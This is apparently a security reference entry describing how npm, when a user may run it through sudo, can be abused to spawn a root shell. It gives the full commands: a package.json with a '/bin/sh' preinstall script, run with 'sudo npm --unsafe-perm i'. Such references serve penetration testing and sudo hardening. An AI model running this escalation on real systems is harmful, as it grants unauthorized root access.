***** Sudo *****
If the binary is allowed to run as superuser by sudo, it does not drop the
elevated privileges and may be used to access the file system, escalate or
maintain privileged access.
    * Additionally, arbitrary script names can be used in place of preinstall
      and triggered by name with, e.g., npm -C $TF run preinstall.
      TF=$(mktemp -d)
      echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
      sudo npm -C $TF --unsafe-perm i
